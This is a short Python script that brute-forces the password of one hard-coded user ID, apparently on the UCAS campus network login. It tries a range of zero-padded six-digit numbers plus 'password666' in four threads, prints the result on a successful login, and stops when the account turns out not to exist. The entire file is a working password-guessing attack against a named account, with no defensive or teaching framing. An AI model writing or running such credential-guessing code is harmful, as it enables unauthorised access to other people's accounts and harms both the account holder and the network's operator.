import LoginUCASNetwork
import threadpool

finded = False

def find(user):
    def test(password):
        global finded
        if finded:
            return
        result, msg, val = LoginUCASNetwork.login(user, password)
        if result:
            LoginUCASNetwork.logout()
            print(val)
            finded = True
        else:
            if msg == 'NoUser':
                finded = True

    return test


passwords = list(range(10000, 10100))
passwords = ['{:0>6d}'.format(v) for v in passwords]
passwords.append('password666')

if __name__ == '__main__':
    pool = threadpool.ThreadPool(4)
    user = '201618013229010'
    finded = False
    f = find(user)
    requests = threadpool.makeRequests(f, passwords)
    [pool.putRequest(req) for req in requests]
    pool.wait()
